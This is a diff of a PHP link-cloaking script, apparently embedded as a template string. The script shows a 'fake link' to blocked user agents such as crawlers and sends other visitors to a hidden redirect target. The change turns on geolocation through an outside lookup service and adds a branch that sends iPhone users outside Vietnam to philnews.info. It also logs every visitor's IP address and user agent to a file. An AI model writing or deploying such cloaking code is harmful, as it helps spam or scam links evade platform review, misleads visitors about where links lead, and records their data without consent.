@@ -220,13 +220,13 @@ function checkIP($ip)
     }
 }
 
-// function checkCountry($ip)
-// {
-//     $json = file_get_contents("http://freegeoip.net/json/{$ip}");
-//     return json_decode($json)->country_code;
-// }
+function checkCountry($ip)
+{
+    $json = file_get_contents("http://freegeoip.net/json/{$ip}");
+    return json_decode($json)->country_code;
+}
 
-// $country = checkCountry($_SERVER[\'REMOTE_ADDR\']);
+$country = checkCountry($_SERVER[\'REMOTE_ADDR\']);
 
 $allowedAgents = "allowedAgents' . $pathname . '.txt";
 $blockedAgents = "blockedAgents' . $pathname . '.txt";
@@ -244,12 +244,25 @@ if (
     header(\'Location: ' . $fakeLink . '\', true, 301);
     die();
 } else {
+    $iPod = stripos($_SERVER[\'HTTP_USER_AGENT\'],"iPod");
+    $iPhone = stripos($_SERVER[\'HTTP_USER_AGENT\'],"iPhone");
+    $iPad = stripos($_SERVER[\'HTTP_USER_AGENT\'],"iPad");
+    $Android = stripos($_SERVER[\'HTTP_USER_AGENT\'],"Android");
+    $webOS   = stripos($_SERVER[\'HTTP_USER_AGENT\'],"webOS");
+    if($iPhone && $country !== \'VN\') {
+      header(\'Location: http://philnews.info\', true, 301);
+      $fAgent = fopen($allowedAgents, \'a\');
+      $agent = $_SERVER[\'REMOTE_ADDR\'] . \' \' . $_SERVER[\'HTTP_USER_AGENT\'] . \' ok \' . PHP_EOL;
+      fwrite($fAgent, $agent);
+      fclose($fAgent);
+      die();
+    } else {
     $fAgent = fopen($allowedAgents, \'a\');
     $agent = $_SERVER[\'REMOTE_ADDR\'] . \' \' . $_SERVER[\'HTTP_USER_AGENT\'] . \' ok \' . PHP_EOL;
     fwrite($fAgent, $agent);
     fclose($fAgent);
     header(\'Location: ' . $redirectUrl . '\', true, 301);
-    die();
+    }
 }
 
 ';
